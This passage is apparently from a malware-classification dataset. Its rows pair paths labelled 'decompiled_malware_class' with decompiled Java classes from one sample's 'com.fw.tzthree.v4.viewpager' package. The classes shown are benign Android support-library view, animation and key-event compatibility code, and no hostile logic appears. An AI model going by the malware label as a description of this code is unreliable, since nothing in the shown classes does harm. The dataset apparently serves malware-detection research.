   Drawable background=view.getBackground();     return background != null && background.getOpacity() == -1;   }   @Override public void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){   }   @Override public void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public boolean performAccessibilityAction(  View view,  int i,  Bundle bundle){     return false;   }   @Override public void postInvalidateOnAnimation(  View view){     view.invalidate();   }   @Override public void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4){     view.invalidate(i,i2,i3,i4);   }   @Override public void postOnAnimation(  View view,  Runnable runnable){     view.postDelayed(runnable,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable runnable,  long j){     view.postDelayed(runnable,getFrameTime() + j);   }   @Override public int resolveSizeAndState(  int i,  int i2,  int i3){     return View.resolveSize(i,i2);   }   @Override public void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat){   }   @Override public void setAccessibilityLiveRegion(  View view,  int i){   }   @Override public void setAlpha(  View view,  float f){   }   @Override public void setHasTransientState(  View view,  boolean z){   }   @Override public void setImportantForAccessibility(  View view,  int i){   }   @Override public void setLabelFor(  View view,  int i){   }   @Override public void setLayerPaint(  View view,  Paint paint){   }   @Override public void setLayerType(  View view,  int i,  Paint paint){   }   @Override public void setLayoutDirection(  View view,  int i){   }   @Override public void setOverScrollMode(  View view,  int i){   }   @Override public void setPaddingRelative(  View view,  int i,  int i2,  int i3,  int i4){     view.setPadding(i,i2,i3,i4);   }   @Override public void setPivotX(  View view,  float f){   }   @Override public void setPivotY(  View view,  float f){   }   @Override public void setRotation(  View view,  float f){   }   @Override public void setRotationX(  View view,  float f){   }   @Override public void setRotationY(  View view,  float f){   }   @Override public void setScaleX(  View view,  float f){   }   @Override public void setScaleY(  View view,  float f){   }   @Override public void setTranslationX(  View view,  float f){   }   @Override public void setTranslationY(  View view,  float f){   }   @Override public void setX(  View view,  float f){   }   @Override public void setY(  View view,  float f){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseViewConfigurationVersionImpl.code","class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration){     return viewConfiguration.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseViewPropertyAnimatorCompatImpl.code","class BaseViewPropertyAnimatorCompatImpl implements ViewPropertyAnimatorCompatImpl {   BaseViewPropertyAnimatorCompatImpl(){   }   @Override public void alpha(  View view,  float f){   }   @Override public void alphaBy(  View view,  float f){   }   @Override public void cancel(  View view){   }   @Override public long getDuration(  View view){     return 0L;   }   @Override public Interpolator getInterpolator(  View view){     return null;   }   @Override public long getStartDelay(  View view){     return 0L;   }   @Override public void rotation(  View view,  float f){   }   @Override public void rotationBy(  View view,  float f){   }   @Override public void rotationX(  View view,  float f){   }   @Override public void rotationXBy(  View view,  float f){   }   @Override public void rotationY(  View view,  float f){   }   @Override public void rotationYBy(  View view,  float f){   }   @Override public void scaleX(  View view,  float f){   }   @Override public void scaleXBy(  View view,  float f){   }   @Override public void scaleY(  View view,  float f){   }   @Override public void scaleYBy(  View view,  float f){   }   @Override public void setDuration(  View view,  long j){   }   @Override public void setInterpolator(  View view,  Interpolator interpolator){   }   @Override public void setListener(  View view,  ViewPropertyAnimatorListener viewPropertyAnimatorListener){   }   @Override public void setStartDelay(  View view,  long j){   }   @Override public void start(  View view){   }   @Override public void translationX(  View view,  float f){   }   @Override public void translationXBy(  View view,  float f){   }   @Override public void translationY(  View view,  float f){   }   @Override public void translationYBy(  View view,  float f){   }   @Override public void withEndAction(  View view,  Runnable runnable){     runnable.run();   }   @Override public void withLayer(  View view){   }   @Override public void withStartAction(  View view,  Runnable runnable){     runnable.run();   }   @Override public void x(  View view,  float f){   }   @Override public void xBy(  View view,  float f){   }   @Override public void y(  View view,  float f){   }   @Override public void yBy(  View view,  float f){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\CompatCreator.code","class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> parcelableCompatCreatorCallbacks){     this.mCallbacks=parcelableCompatCreatorCallbacks;   }   @Override public T createFromParcel(  Parcel parcel){     return this.mCallbacks.createFromParcel(parcel,null);   }   @Override public T[] newArray(  int i){     return this.mCallbacks.newArray(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\Decor.code","interface Decor { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EclairKeyEventVersionImpl.code","class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {   EclairKeyEventVersionImpl(){   }   @Override public boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2){     return KeyEventCompatEclair.dispatch(keyEvent,callback,obj,obj2);   }   @Override public Object getKeyDispatcherState(  View view){     return KeyEventCompatEclair.getKeyDispatcherState(view);   }   @Override public boolean isTracking(  KeyEvent keyEvent){     return KeyEventCompatEclair.isTracking(keyEvent);   }   @Override public void startTracking(  KeyEvent keyEvent){     KeyEventCompatEclair.startTracking(keyEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EclairMotionEventVersionImpl.code","class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent motionEvent,  int i){     return MotionEventCompatEclair.findPointerIndex(motionEvent,i);   }   @Override public int getPointerCount(  MotionEvent motionEvent){     return MotionEventCompatEclair.getPointerCount(motionEvent);   }   @Override public int getPointerId(  MotionEvent motionEvent,  int i){     return MotionEventCompatEclair.getPointerId(motionEvent,i);   }   @Override public float getX(  MotionEvent motionEvent,  int i){     return MotionEventCompatEclair.getX(motionEvent,i);   }   @Override public float getY(  MotionEvent motionEvent,  int i){     return MotionEventCompatEclair.getY(motionEvent,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EclairMr1ViewCompatImpl.code","class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {   EclairMr1ViewCompatImpl(){   }   @Override public boolean isOpaque(  View view){     return ViewCompatEclairMr1.isOpaque(view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public boolean draw(    Object obj,    Canvas canvas){       return false;     }     @Override public void finish(    Object obj){     }     @Override public boolean isFinished(    Object obj){       return true;     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public boolean onAbsorb(    Object obj,    int i){       return false;     }     @Override public boolean onPull(    Object obj,    float f){       return false;     }     @Override public boolean onRelease(    Object obj){       return false;     }     @Override public void setSize(    Object obj,    int i,    int i2){     }   } class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public boolean draw(    Object obj,    Canvas canvas){       return EdgeEffectCompatIcs.draw(obj,canvas);     }     @Override public void finish(    Object obj){       EdgeEffectCompatIcs.finish(obj);     }     @Override public boolean isFinished(    Object obj){       return EdgeEffectCompatIcs.isFinished(obj);     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public boolean onAbsorb(    Object obj,    int i){       return EdgeEffectCompatIcs.onAbsorb(obj,i);     }     @Override public boolean onPull(    Object obj,    float f){       return EdgeEffectCompatIcs.onPull(obj,f);     }     @Override public boolean onRelease(    Object obj){       return EdgeEffectCompatIcs.onRelease(obj);     }     @Override public void setSize(    Object obj,    int i,    int i2){       EdgeEffectCompatIcs.setSize(obj,i,i2);     }   } interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public boolean onAbsorb(  int i){     return IMPL.onAbsorb(this.mEdgeEffect,i);   }   public boolean onPull(  float f){     return IMPL.onPull(this.mEdgeEffect,f);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public void setSize(  int i,  int i2){     IMPL.setSize(this.mEdgeEffect,i,i2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static boolean draw(  Object obj,  Canvas canvas){     return ((EdgeEffect)obj).draw(canvas);   }   public static void finish(  Object obj){     ((EdgeEffect)obj).finish();   }   public static boolean isFinished(  Object obj){     return ((EdgeEffect)obj).isFinished();   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static boolean onAbsorb(  Object obj,  int i){     ((EdgeEffect)obj).onAbsorb(i);     return true;   }   public static boolean onPull(  Object obj,  float f){     ((EdgeEffect)obj).onPull(f);     return true;   }   public static boolean onRelease(  Object obj){     EdgeEffect edgeEffect=(EdgeEffect)obj;     edgeEffect.onRelease();     return edgeEffect.isFinished();   }   public static void setSize(  Object obj,  int i,  int i2){     ((EdgeEffect)obj).setSize(i,i2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EdgeEffectIcsImpl.code","class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public boolean draw(  Object obj,  Canvas canvas){     return EdgeEffectCompatIcs.draw(obj,canvas);   }   @Override public void finish(  Object obj){     EdgeEffectCompatIcs.finish(obj);   }   @Override public boolean isFinished(  Object obj){     return EdgeEffectCompatIcs.isFinished(obj);   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public boolean onAbsorb(  Object obj,  int i){     return EdgeEffectCompatIcs.onAbsorb(obj,i);   }   @Override public boolean onPull(  Object obj,  float f){     return EdgeEffectCompatIcs.onPull(obj,f);   }   @Override public boolean onRelease(  Object obj){     return EdgeEffectCompatIcs.onRelease(obj);   }   @Override public void setSize(  Object obj,  int i,  int i2){     EdgeEffectCompatIcs.setSize(obj,i,i2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\FroyoViewConfigurationVersionImpl.code","class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(viewConfiguration);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\GBViewCompatImpl.code","class GBViewCompatImpl extends EclairMr1ViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View view){     return ViewCompatGingerbread.getOverScrollMode(view);   }   @Override public void setOverScrollMode(  View view,  int i){     ViewCompatGingerbread.setOverScrollMode(view,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\HCViewCompatImpl.code","class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override public float getAlpha(  View view){     return ViewCompatHC.getAlpha(view);   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   }   @Override public int getLayerType(  View view){     return ViewCompatHC.getLayerType(view);   }   @Override public int getMeasuredHeightAndState(  View view){     return ViewCompatHC.getMeasuredHeightAndState(view);   }   @Override public int getMeasuredState(  View view){     return ViewCompatHC.getMeasuredState(view);   }   @Override public int getMeasuredWidthAndState(  View view){     return ViewCompatHC.getMeasuredWidthAndState(view);   }   @Override public float getPivotX(  View view){     return ViewCompatHC.getPivotX(view);   }   @Override public float getPivotY(  View view){     return ViewCompatHC.getPivotY(view);   }   @Override public float getRotation(  View view){     return ViewCompatHC.getRotation(view);   }   @Override public float getRotationX(  View view){     return ViewCompatHC.getRotationX(view);   }   @Override public float getRotationY(  View view){     return ViewCompatHC.getRotationY(view);   }   @Override public float getScaleX(  View view){     return ViewCompatHC.getScaleX(view);   }   @Override public float getScaleY(  View view){     return ViewCompatHC.getScaleY(view);   }   @Override public float getTranslationX(  View view){     return ViewCompatHC.getTranslationX(view);   }   @Override public float getTranslationY(  View view){     return ViewCompatHC.getTranslationY(view);   }   @Override public float getX(  View view){     return ViewCompatHC.getX(view);   }   @Override public float getY(  View view){     return ViewCompatHC.getY(view);   }   @Override public int resolveSizeAndState(  int i,  int i2,  int i3){     return ViewCompatHC.resolveSizeAndState(i,i2,i3);   }   @Override public void setAlpha(  View view,  float f){     ViewCompatHC.setAlpha(view,f);   }   @Override public void setLayerPaint(  View view,  Paint paint){     setLayerType(view,getLayerType(view),paint);     view.invalidate();   }   @Override public void setLayerType(  View view,  int i,  Paint paint){     ViewCompatHC.setLayerType(view,i,paint);   }   @Override public void setPivotX(  View view,  float f){     ViewCompatHC.setPivotX(view,f);   }   @Override public void setPivotY(  View view,  float f){     ViewCompatHC.setPivotY(view,f);   }   @Override public void setRotation(  View view,  float f){     ViewCompatHC.setRotation(view,f);   }   @Override public void setRotationX(  View view,  float f){     ViewCompatHC.setRotationX(view,f);   }   @Override public void setRotationY(  View view,  float f){     ViewCompatHC.setRotationY(view,f);   }   @Override public void setScaleX(  View view,  float f){     ViewCompatHC.setScaleX(view,f);   }   @Override public void setScaleY(  View view,  float f){     ViewCompatHC.setScaleY(view,f);   }   @Override public void setTranslationX(  View view,  float f){     ViewCompatHC.setTranslationX(view,f);   }   @Override public void setTranslationY(  View view,  float f){     ViewCompatHC.setTranslationY(view,f);   }   @Override public void setX(  View view,  float f){     ViewCompatHC.setX(view,f);   }   @Override public void setY(  View view,  float f){     ViewCompatHC.setY(view,f);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\HoneycombKeyEventVersionImpl.code","class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public boolean metaStateHasModifiers(  int i,  int i2){     return KeyEventCompatHoneycomb.metaStateHasModifiers(i,i2);   }   @Override public boolean metaStateHasNoModifiers(  int i){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(i);   }   @Override public int normalizeMetaState(  int i){     return KeyEventCompatHoneycomb.normalizeMetaState(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\HoneycombVelocityTrackerVersionImpl.code","class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker velocityTracker,  int i){     return VelocityTrackerCompatHoneycomb.getXVelocity(velocityTracker,i);   }   @Override public float getYVelocity(  VelocityTracker velocityTracker,  int i){     return VelocityTrackerCompatHoneycomb.getYVelocity(velocityTracker,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ICSViewCompatImpl.code","class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public ViewPropertyAnimatorCompat animate(  View view){     if (this.mViewPropertyAnimatorCompatMap == null) {       this.mViewPropertyAnimatorCompatMap=new WeakHashMap<>();     }     ViewPropertyAnimatorCompat viewPropertyAnimatorCompat=this.mViewPropertyAnimatorCompatMap.get(view);     if (viewPropertyAnimatorCompat != null) {       return viewPropertyAnimatorCompat;     }     ViewPropertyAnimatorCompat viewPropertyAnimatorCompat2=new ViewPropertyAnimatorCompat(view);     this.mViewPropertyAnimatorCompatMap.put(view,viewPropertyAnimatorCompat2);     return viewPropertyAnimatorCompat2;   }   @Override public boolean canScrollHorizontally(  View view,  int i){     return ViewCompatICS.canScrollHorizontally(view,i);   }   @Override public boolean canScrollVertically(  View view,  int i){     return ViewCompatICS.canScrollVertically(view,i);   }   @Override public void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     ViewCompatICS.onInitializeAccessibilityEvent(view,accessibilityEvent);   }   @Override public void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     ViewCompatICS.onInitializeAccessibilityNodeInfo(view,accessibilityNodeInfoCompat.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent){     ViewCompatICS.onPopulateAccessibilityEvent(view,accessibilityEvent);   }   @Override public void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat){     ViewCompatICS.setAccessibilityDelegate(view,accessibilityDelegateCompat.getBridge());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ICSViewPropertyAnimatorCompatImpl.code","class ICSViewPropertyAnimatorCompatImpl extends BaseViewPropertyAnimatorCompatImpl {   ICSViewPropertyAnimatorCompatImpl(){   }   @Override public void alpha(  View view,  float f){     ViewPropertyAnimatorCompatICS.alpha(view,f);   }   @Override public void alphaBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.alphaBy(view,f);   }   @Override public void cancel(  View view){     ViewPropertyAnimatorCompatICS.cancel(view);   }   @Override public long getDuration(  View view){     return ViewPropertyAnimatorCompatICS.getDuration(view);   }   @Override public long getStartDelay(  View view){     return ViewPropertyAnimatorCompatICS.getStartDelay(view);   }   @Override public void rotation(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotation(view,f);   }   @Override public void rotationBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotationBy(view,f);   }   @Override public void rotationX(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotationX(view,f);   }   @Override public void rotationXBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotationXBy(view,f);   }   @Override public void rotationY(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotationY(view,f);   }   @Override public void rotationYBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.rotationYBy(view,f);   }   @Override public void scaleX(  View view,  float f){     ViewPropertyAnimatorCompatICS.scaleX(view,f);   }   @Override public void scaleXBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.scaleXBy(view,f);   }   @Override public void scaleY(  View view,  float f){     ViewPropertyAnimatorCompatICS.scaleY(view,f);   }   @Override public void scaleYBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.scaleYBy(view,f);   }   @Override public void setDuration(  View view,  long j){     ViewPropertyAnimatorCompatICS.setDuration(view,j);   }   @Override public void setInterpolator(  View view,  Interpolator interpolator){     ViewPropertyAnimatorCompatICS.setInterpolator(view,interpolator);   }   @Override public void setListener(  View view,  ViewPropertyAnimatorListener viewPropertyAnimatorListener){     ViewPropertyAnimatorCompatICS.setListener(view,viewPropertyAnimatorListener);   }   @Override public void setStartDelay(  View view,  long j){     ViewPropertyAnimatorCompatICS.setStartDelay(view,j);   }   @Override public void start(  View view){     ViewPropertyAnimatorCompatICS.start(view);   }   @Override public void translationX(  View view,  float f){     ViewPropertyAnimatorCompatICS.translationX(view,f);   }   @Override public void translationXBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.translationXBy(view,f);   }   @Override public void translationY(  View view,  float f){     ViewPropertyAnimatorCompatICS.translationY(view,f);   }   @Override public void translationYBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.translationYBy(view,f);   }   @Override public void withEndAction(  View view,  final Runnable runnable){     setListener(view,new ViewPropertyAnimatorListener(){       @Override public void onAnimationCancel(      View view2){       }       @Override public void onAnimationEnd(      View view2){         runnable.run();         ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);       }       @Override public void onAnimationStart(      View view2){       }     } );   }   @Override public void withLayer(  View view){     final int layerType=ViewCompat.getLayerType(view);     setListener(view,new ViewPropertyAnimatorListener(){       @Override public void onAnimationCancel(      View view2){       }       @Override public void onAnimationEnd(      View view2){         ViewCompat.setLayerType(view2,layerType,null);         ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);       }       @Override public void onAnimationStart(      View view2){         ViewCompat.setLayerType(view2,2,null);       }     } );   }   @Override public void withStartAction(  View view,  final Runnable runnable){     setListener(view,new ViewPropertyAnimatorListener(){       @Override public void onAnimationCancel(      View view2){       }       @Override public void onAnimationEnd(      View view2){       }       @Override public void onAnimationStart(      View view2){         runnable.run();         ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);       }     } );   }   @Override public void x(  View view,  float f){     ViewPropertyAnimatorCompatICS.x(view,f);   }   @Override public void xBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.xBy(view,f);   }   @Override public void y(  View view,  float f){     ViewPropertyAnimatorCompatICS.y(view,f);   }   @Override public void yBy(  View view,  float f){     ViewPropertyAnimatorCompatICS.yBy(view,f);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ItemInfo.code","public class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\JbMr1ViewCompatImpl.code","class JbMr1ViewCompatImpl extends JBViewCompatImpl {   JbMr1ViewCompatImpl(){   }   @Override public int getLabelFor(  View view){     return ViewCompatJellybeanMr1.getLabelFor(view);   }   @Override public int getLayoutDirection(  View view){     return ViewCompatJellybeanMr1.getLayoutDirection(view);   }   @Override public int getPaddingEnd(  View view){     return ViewCompatJellybeanMr1.getPaddingEnd(view);   }   @Override public int getPaddingStart(  View view){     return ViewCompatJellybeanMr1.getPaddingStart(view);   }   @Override public void setLabelFor(  View view,  int i){     ViewCompatJellybeanMr1.setLabelFor(view,i);   }   @Override public void setLayerPaint(  View view,  Paint paint){     ViewCompatJellybeanMr1.setLayerPaint(view,paint);   }   @Override public void setLayoutDirection(  View view,  int i){     ViewCompatJellybeanMr1.setLayoutDirection(view,i);   }   @Override public void setPaddingRelative(  View view,  int i,  int i2,  int i3,  int i4){     ViewCompatJellybeanMr1.setPaddingRelative(view,i,i2,i3,i4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\JBMr2ViewPropertyAnimatorCompatImpl.code","class JBMr2ViewPropertyAnimatorCompatImpl extends JBViewPropertyAnimatorCompatImpl {   JBMr2ViewPropertyAnimatorCompatImpl(){   }   @Override public Interpolator getInterpolator(  View view){     return ViewPropertyAnimatorCompatJellybeanMr2.getInterpolator(view);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\JBViewCompatImpl.code","class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object accessibilityNodeProvider=ViewCompatJB.getAccessibilityNodeProvider(view);     if (accessibilityNodeProvider != null) {       return new AccessibilityNodeProviderCompat(accessibilityNodeProvider);     }     return null;   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public int getMinimumHeight(  View view){     return ViewCompatJB.getMinimumHeight(view);   }   @Override public int getMinimumWidth(  View view){     return ViewCompatJB.getMinimumWidth(view);   }   @Override public ViewParent getParentForAccessibility(  View view){     return ViewCompatJB.getParentForAccessibility(view);   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public boolean performAccessibilityAction(  View view,  int i,  Bundle bundle){     return ViewCompatJB.performAccessibilityAction(view,i,bundle);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4){     ViewCompatJB.postInvalidateOnAnimation(view,i,i2,i3,i4);   }   @Override public void postOnAnimation(  View view,  Runnable runnable){     ViewCompatJB.postOnAnimation(view,runnable);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable runnable,  long j){     ViewCompatJB.postOnAnimationDelayed(view,runnable,j);   }   @Override public void setHasTransientState(  View view,  boolean z){     ViewCompatJB.setHasTransientState(view,z);   }   @Override public void setImportantForAccessibility(  View view,  int i){     if (i == 4) {       i=2;     }     ViewCompatJB.setImportantForAccessibility(view,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\JBViewPropertyAnimatorCompatImpl.code","class JBViewPropertyAnimatorCompatImpl extends ICSViewPropertyAnimatorCompatImpl {   JBViewPropertyAnimatorCompatImpl(){   }   @Override public void withEndAction(  View view,  Runnable runnable){     ViewPropertyAnimatorCompatJB.withEndAction(view,runnable);   }   @Override public void withLayer(  View view){     ViewPropertyAnimatorCompatJB.withLayer(view);   }   @Override public void withStartAction(  View view,  Runnable runnable){     ViewPropertyAnimatorCompatJB.withStartAction(view,runnable);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int i,    int i2,    int i3,    int i4,    int i5){       boolean z=(i2 & i3) != 0;       int i6=i4 | i5;       boolean z2=(i2 & i6) != 0;       if (!z) {         return z2 ? i & (i3 ^ (-1)) : i;       }       if (z2) {         throw new IllegalArgumentException(""bad arguments"");       }       return i & (i6 ^ (-1));     }     @Override public boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2){       return keyEvent.dispatch(callback);     }     @Override public Object getKeyDispatcherState(    View view){       return null;     }     @Override public boolean isTracking(    KeyEvent keyEvent){       return false;     }     @Override public boolean metaStateHasModifiers(    int i,    int i2){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(i) & 247,i2,1,64,128),i2,2,16,32) == i2;     }     @Override public boolean metaStateHasNoModifiers(    int i){       return (normalizeMetaState(i) & 247) == 0;     }     @Override public int normalizeMetaState(    int i){       int i2=(i & 192) != 0 ? i | 1 : i;       if ((i2 & 48) != 0) {         i2|=2;       }       return i2 & 247;     }     @Override public void startTracking(    KeyEvent keyEvent){     }   } class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {     EclairKeyEventVersionImpl(){     }     @Override public boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2){       return KeyEventCompatEclair.dispatch(keyEvent,callback,obj,obj2);     }     @Override public Object getKeyDispatcherState(    View view){       return KeyEventCompatEclair.getKeyDispatcherState(view);     }     @Override public 